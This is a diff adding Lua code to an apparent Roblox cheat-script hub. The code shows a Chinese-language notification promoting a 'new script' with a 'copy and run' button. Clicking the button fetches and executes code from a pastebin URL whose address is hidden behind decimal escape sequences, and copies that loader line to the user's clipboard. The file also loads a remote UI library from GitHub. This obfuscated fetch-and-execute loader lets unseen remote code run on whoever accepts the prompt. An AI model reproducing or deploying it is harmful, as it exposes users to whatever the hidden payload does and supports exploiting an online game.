@@ -1,3 +1,56 @@
+-- 创建回调函数
+local callback = Instance.new("BindableFunction")
+callback.Name = "ImagePromptCallback"
+
+callback.OnInvoke = function(choice)
+    if choice == "复制并运行" then
+        -- 要执行的脚本（ASCII编码）
+        local scriptToRun = 'loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\98\115\89\84\101\113\110\106"))()'
+        
+        -- 复制到剪贴板
+        pcall(function()
+            setclipboard(scriptToRun)
+        end)
+        
+        -- 执行脚本
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\98\115\89\84\101\113\110\106"))()
+
+        end)
+        
+        if success then
+            print("脚本执行成功！")
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "成功",
+                Text = "脚本已复制并执行",
+                Duration = 5,
+                Icon = "rbxassetid://6238537240"
+            })
+        else
+            warn("脚本执行失败: "..tostring(err))
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "错误",
+                Text = "执行失败: "..tostring(err),
+                Duration = 5,
+                Icon = "rbxassetid://6238537240"
+            })
+        end
+    elseif choice == "否" then
+        print("用户取消了操作")
+    end
+end
+
+-- 发送带图片的通知
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "全新脚本来了",
+    Text = "全新UI，全新的脚本（飞扬存储功能未添加在里面后续更新）",
+    Duration = 12,                  -- 12秒后自动消失（设为 0 则不自动关闭）
+    Icon = "rbxassetid://6238537240", -- 使用Roblox默认图标
+    Button1 = "复制并运行",
+    Button2 = "否",
+    Callback = callback,            -- 绑定回调函数
+})
+
 local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
 
 local win = DiscordLib:Window("高脚本[测试阶段]")
